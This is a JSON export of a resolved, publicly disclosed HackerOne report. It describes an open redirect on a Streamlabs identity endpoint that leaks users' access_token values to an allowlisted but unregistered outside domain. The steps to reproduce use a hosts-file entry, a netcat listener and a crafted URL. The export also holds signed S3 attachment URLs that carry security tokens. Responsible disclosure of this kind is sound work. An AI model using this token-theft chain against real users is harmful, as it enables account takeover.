{
  "id": 1327742,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzI3NzQy",
  "url": "https://hackerone.com/reports/1327742",
  "title": "Steal any users `access_token` via open redirect in https://streamlabs.com/global/identity?popup=1&r=",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-09-02T04:53:32.363Z",
  "submitted_at": "2021-09-02T04:53:32.503Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "sudi",
    "url": "/sudi",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/h54zoekbmc0kqlq42xu2vqj6ge13/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 32972,
    "url": "https://hackerone.com/logitech",
    "handle": "logitech",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/032/972/8aa1ae9384c034f209edabfd44bac468c0bbbcdb_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/032/972/8aa1ae9384c034f209edabfd44bac468c0bbbcdb_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Logitech",
      "twitter_handle": "logitech",
      "website": "https://www.logitech.com",
      "about": "Logitech is a consumer electronics manufacturer, specialising in smart home and video collaboration equipment, gaming accessories and peripherals"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-11-04T15:55:53.069Z",
  "bug_reporter_agreed_on_going_public_at": "2021-09-10T04:23:01.024Z",
  "team_member_agreed_on_going_public_at": "2021-11-04T15:55:52.940Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Heyy there,\nAfter  reading the disclosed report #1178239, I started to look for bypasses but I found that it's restricted to only streamlabs.com and merch.streamlabs.com , providing any other domain or subdomain of streamlabs.com gives an error instead of the 302 redirect.\n\nFrom wayback machine (https://web.archive.org/), I found a bunch of domains which were  used in the redirect parameter `r`.\n```\nhttps://streamlabs.com/global/identity?r=https://darthvapes.tv\nhttps://streamlabs.com/global/identity?r=https://dragynslair.live/\nhttps://streamlabs.com/global/identity?r=https://franmg.net/merch\nhttps://streamlabs.com/global/identity?r=https://itzyony2.com\nhttps://streamlabs.com/global/identity?r=https://lmgtwitch.com\nhttps://streamlabs.com/global/identity?r=https://maitresharinganv1.com\nhttps://streamlabs.com/global/identity?r=https://themavshow.tv\nhttps://streamlabs.com/global/identity?r=https://veterangamertv.com\nhttps://streamlabs.com/global/identity?r=https://www.koopatroop.com\nhttps://streamlabs.com/global/identity?r=https://www.lokenplays.com\nhttps://streamlabs.com/global/identity?r=https://yagurlbubblezl4d.com\n```\n\nVisiting all these urls in my browser I found that only these 3 domains were allowed (the access_token was sent to this domains)\ndragynslair.live\ndarthvapes.tv\nnixxiom.tv\n\n\nIf an authenticated user visits this url, his access_token will be sent to the dragynslair.live domain:\nhttps://streamlabs.com/global/identity?r=https://dragynslair.live/\n\n{F1433713}\nIn this screenshot you can see that the `access_token` is added as a query parameter.\n\nThe most interesting thing about this particular domain is that it is available for registration, which you can verify from here:\nhttps://www.name.com/domain/search/dragynslair.live\n\nAnyone can buy this domain name for $3 , which will allow him to takeover any streamlab's user account \n{F1433718}\n\n----------\n\n**Steps to reproduce:**\nAs I haven't actually purchased this domain name `dragynslair.live` , to prove that I can steal the `access_token`. I will add dragynslair.live to my `/etc/hosts` file which will point to 127.0.0.1 and a web server wil be running on port 80 locally.\nThis should be enough to validate this finding.\n\n1.Open your `/etc/hosts` file and add this line to it , save it\n```bash\n127.0.0.1  dragynslair.live\n```\n2.Now start a web server on port 80 by using this command  `sudo nc -lvk 80`\n3.Open this url https://streamlabs.com/global/identity?popup=1&r=http://dragynslair.live (make sure the user is authenticated)\n4.Check the ncat command output you should see the `access_token` parameter \n\n{F1433725}\n\n\nThis access_token then can be used in the following api endpoints: https://dev.streamlabs.com/reference\n\n------------\n\n## Impact\n\nBy just sending the url an attacker can steal victim's `access_token` which can be used in the streamlabs api endpoints.\n\n\nThankyou\nRegards\nSudhanshu",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1433713,
      "file_name": "BurpSuiteCommunity_SxHPNdXsnP.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jnyaiiq4dsgaqgp4oiggljiva74b?response-content-disposition=attachment%3B%20filename%3D%22BurpSuiteCommunity_SxHPNdXsnP.png%22%3B%20filename%2A%3DUTF-8%27%27BurpSuiteCommunity_SxHPNdXsnP.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7SCPRKA5%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T011537Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQDufh0seVVcIe9153bkaiAxwY5mY5j9UlE7uCpDArri3AIgcp%2B%2FvBNWTUWZ82fczJ1a%2Fi97f46OwcxG2mr5J9G89F8qugUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDI%2FlZxVue5AyqwIbtiqOBYyi0Xnlk4PnlEpkLweypNROwzpiq00sxhF3DhzJnMuVmY4ITcFEF1E2Xf3MtYXEfMEDKRnx1o%2ForaMKkylQZoL5rWp1yVfrKLfhvSd67WvrSsq53J8UAMHV8Bdr5XYAeTut8oMCG6wFFQNu%2BkWkV%2FsDujix9fSc9t05QT9or4pIeJiRBb%2FFtuFbxvZBC3QeyOtJqa5uoJnrhfmR2ch43nrqPoJ4dplUxFdHp%2F3JxPs2M%2F%2FndqnMJlnVfZPFdd%2FtpXtMIrMJQVSRI1yBGBBCkb5MY0z6F56FVayA2xuuohiZm0UXYmG7UaRCdSGWFkvgNRpWSIEDnk4hxu7tqsak5amJXoS0NLra6YOVmMCg3omgkr05nWNc%2FHfnYH6FEYz3s1R9zx3Dz6OD9nj5oNON%2FOpMqRgsQNvy2kSqFnBX2CdtlER9G8zg2%2FozU9knXHFQX2gXSFi4UZq5PzFA31QU4iBAXqZTfguCoSdmMCG%2Fc55DNHn1fl1LyCaixMwZGlUhcSOrJ%2B5xYGVgm0FgznHtpOLaM1JHjrbcgWLu6DnjnnegPVPgedS4KBlhYWI7iqM7xQl58uxjieZnzpIcjE1GCY8maJ0m5ge5jWmEH%2BlPFeozYa4q6sULH4LsdjvllnPxQEH0a68x3tCP3fhcu4FHs%2BWgUd4HOEkBQtZqX0Hm82oMgdTaXxJ7CUIjyBxK1lsm%2BM%2BxjOv9Dne6KV%2BmEchw3NwAv1DoO0PUHOPkk%2BYNxKbQqpv1b%2BA3G48GE5Lbt%2FuZe%2BpPRh8nHxREP6sFa2gGdD0RRAZVhTSWso4b%2BNNK1dHGqi2BwAoWaPBV3hlHahbw%2BhjkdQralU3sLvw1dC4zw4ShZ90m%2FI3bbdB56K9jHjCqqLzGBjqxAan4F4jOpcwyXOTpPdNsRIBoI4OGX22%2BCha2XpiuUlJJNEnA5QGd7UKxJczsnZe%2BETW5Ua%2FwKi2BWbKg%2BoVFV3R5049xm9PFQpw7mcd3m9YT%2F33Hgqorj7Eazph69M4C4EQHYQ2t2L8UuzoAhi%2Fe%2FOp5yfIdwmHoIKNcEl14fWev0jMCO%2F4vAo1eMKF9Jgah%2BEi2aG3wOgf6lz2ZQMWvlegF%2BA%2BTDeqkSwjUpjjF11hRGQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7d7adfc1b539a555e12dd3d2e3cf6330a9155b91cac5ba6e7b785045ac2c2f4e",
      "file_size": 51329,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1433718,
      "file_name": "firefox_ZayRHz2tWl.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1ngnijr7alo1btq0id28zj9w6xi3?response-content-disposition=attachment%3B%20filename%3D%22firefox_ZayRHz2tWl.png%22%3B%20filename%2A%3DUTF-8%27%27firefox_ZayRHz2tWl.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7SCPRKA5%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T011537Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQDufh0seVVcIe9153bkaiAxwY5mY5j9UlE7uCpDArri3AIgcp%2B%2FvBNWTUWZ82fczJ1a%2Fi97f46OwcxG2mr5J9G89F8qugUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDI%2FlZxVue5AyqwIbtiqOBYyi0Xnlk4PnlEpkLweypNROwzpiq00sxhF3DhzJnMuVmY4ITcFEF1E2Xf3MtYXEfMEDKRnx1o%2ForaMKkylQZoL5rWp1yVfrKLfhvSd67WvrSsq53J8UAMHV8Bdr5XYAeTut8oMCG6wFFQNu%2BkWkV%2FsDujix9fSc9t05QT9or4pIeJiRBb%2FFtuFbxvZBC3QeyOtJqa5uoJnrhfmR2ch43nrqPoJ4dplUxFdHp%2F3JxPs2M%2F%2FndqnMJlnVfZPFdd%2FtpXtMIrMJQVSRI1yBGBBCkb5MY0z6F56FVayA2xuuohiZm0UXYmG7UaRCdSGWFkvgNRpWSIEDnk4hxu7tqsak5amJXoS0NLra6YOVmMCg3omgkr05nWNc%2FHfnYH6FEYz3s1R9zx3Dz6OD9nj5oNON%2FOpMqRgsQNvy2kSqFnBX2CdtlER9G8zg2%2FozU9knXHFQX2gXSFi4UZq5PzFA31QU4iBAXqZTfguCoSdmMCG%2Fc55DNHn1fl1LyCaixMwZGlUhcSOrJ%2B5xYGVgm0FgznHtpOLaM1JHjrbcgWLu6DnjnnegPVPgedS4KBlhYWI7iqM7xQl58uxjieZnzpIcjE1GCY8maJ0m5ge5jWmEH%2BlPFeozYa4q6sULH4LsdjvllnPxQEH0a68x3tCP3fhcu4FHs%2BWgUd4HOEkBQtZqX0Hm82oMgdTaXxJ7CUIjyBxK1lsm%2BM%2BxjOv9Dne6KV%2BmEchw3NwAv1DoO0PUHOPkk%2BYNxKbQqpv1b%2BA3G48GE5Lbt%2FuZe%2BpPRh8nHxREP6sFa2gGdD0RRAZVhTSWso4b%2BNNK1dHGqi2BwAoWaPBV3hlHahbw%2BhjkdQralU3sLvw1dC4zw4ShZ90m%2FI3bbdB56K9jHjCqqLzGBjqxAan4F4jOpcwyXOTpPdNsRIBoI4OGX22%2BCha2XpiuUlJJNEnA5QGd7UKxJczsnZe%2BETW5Ua%2FwKi2BWbKg%2BoVFV3R5049xm9PFQpw7mcd3m9YT%2F33Hgqorj7Eazph69M4C4EQHYQ2t2L8UuzoAhi%2Fe%2FOp5yfIdwmHoIKNcEl14fWev0jMCO%2F4vAo1eMKF9Jgah%2BEi2aG3wOgf6lz2ZQMWvlegF%2BA%2BTDeqkSwjUpjjF11hRGQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3bc8c66cd8242032738a64e200b9161736af70534963d7b2cd350d2bd09a8151",
      "file_size": 40908,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1433725,
      "file_name": "ubuntu_dSh04rREny.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/e4b9ka6s161br0dxhhvuvtt0wrcy?response-content-disposition=attachment%3B%20filename%3D%22ubuntu_dSh04rREny.png%22%3B%20filename%2A%3DUTF-8%27%27ubuntu_dSh04rREny.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7SCPRKA5%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T011537Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQDufh0seVVcIe9153bkaiAxwY5mY5j9UlE7uCpDArri3AIgcp%2B%2FvBNWTUWZ82fczJ1a%2Fi97f46OwcxG2mr5J9G89F8qugUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDI%2FlZxVue5AyqwIbtiqOBYyi0Xnlk4PnlEpkLweypNROwzpiq00sxhF3DhzJnMuVmY4ITcFEF1E2Xf3MtYXEfMEDKRnx1o%2ForaMKkylQZoL5rWp1yVfrKLfhvSd67WvrSsq53J8UAMHV8Bdr5XYAeTut8oMCG6wFFQNu%2BkWkV%2FsDujix9fSc9t05QT9or4pIeJiRBb%2FFtuFbxvZBC3QeyOtJqa5uoJnrhfmR2ch43nrqPoJ4dplUxFdHp%2F3JxPs2M%2F%2FndqnMJlnVfZPFdd%2FtpXtMIrMJQVSRI1yBGBBCkb5MY0z6F56FVayA2xuuohiZm0UXYmG7UaRCdSGWFkvgNRpWSIEDnk4hxu7tqsak5amJXoS0NLra6YOVmMCg3omgkr05nWNc%2FHfnYH6FEYz3s1R9zx3Dz6OD9nj5oNON%2FOpMqRgsQNvy2kSqFnBX2CdtlER9G8zg2%2FozU9knXHFQX2gXSFi4UZq5PzFA31QU4iBAXqZTfguCoSdmMCG%2Fc55DNHn1fl1LyCaixMwZGlUhcSOrJ%2B5xYGVgm0FgznHtpOLaM1JHjrbcgWLu6DnjnnegPVPgedS4KBlhYWI7iqM7xQl58uxjieZnzpIcjE1GCY8maJ0m5ge5jWmEH%2BlPFeozYa4q6sULH4LsdjvllnPxQEH0a68x3tCP3fhcu4FHs%2BWgUd4HOEkBQtZqX0Hm82oMgdTaXxJ7CUIjyBxK1lsm%2BM%2BxjOv9Dne6KV%2BmEchw3NwAv1DoO0PUHOPkk%2BYNxKbQqpv1b%2BA3G48GE5Lbt%2FuZe%2BpPRh8nHxREP6sFa2gGdD0RRAZVhTSWso4b%2BNNK1dHGqi2BwAoWaPBV3hlHahbw%2BhjkdQralU3sLvw1dC4zw4ShZ90m%2FI3bbdB56K9jHjCqqLzGBjqxAan4F4jOpcwyXOTpPdNsRIBoI4OGX22%2BCha2XpiuUlJJNEnA5QGd7UKxJczsnZe%2BETW5Ua%2FwKi2BWbKg%2BoVFV3R5049xm9PFQpw7mcd3m9YT%2F33Hgqorj7Eazph69M4C4EQHYQ2t2L8UuzoAhi%2Fe%2FOp5yfIdwmHoIKNcEl14fWev0jMCO%2F4vAo1eMKF9Jgah%2BEi2aG3wOgf6lz2ZQMWvlegF%2BA%2BTDeqkSwjUpjjF11hRGQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a7793d0507523c9e24afd89576fdacddb028beb77bd798e292e49f8e9a201c68",
      "file_size": 29971,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 27,
  "voters": [
    "mr-medi",
    "chux",
    "nrockhouse",
    "rootz491",
    "alp",
    "shreyaschavhan",
    "dnelsaka",
    "th4nu_0x0",
    "dmc3",
    "akashhamal0x01",
    "and 17 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.4,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 52462,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.streamlabs.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
